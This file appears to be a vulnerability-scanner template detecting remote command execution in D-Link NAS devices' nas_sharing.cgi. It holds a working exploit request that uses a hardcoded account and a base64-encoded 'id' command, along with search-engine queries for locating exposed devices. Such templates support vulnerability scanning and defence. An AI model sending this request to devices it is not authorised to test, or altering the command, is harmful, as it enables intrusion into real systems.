id: D-Link_NAS_system_RCE

info:
  name: D-Link_NAS_system_RCE
  author: HK
  severity: high
  description: Remote command execution exists on the nas_sharing.cgi interface of the D-Link NAS device
  metadata:
    max-request: 1
    shodan-query: ""
    Fofa-query: body="Text:In order to access the ShareCenter"
    Hunter-query: body="Text:In order to access the ShareCenter"
    Quake-query: body="Text:In order to access the ShareCenter"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=aWQ= HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
    Accept: */*
    Connection: Keep-Alive


  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - uid=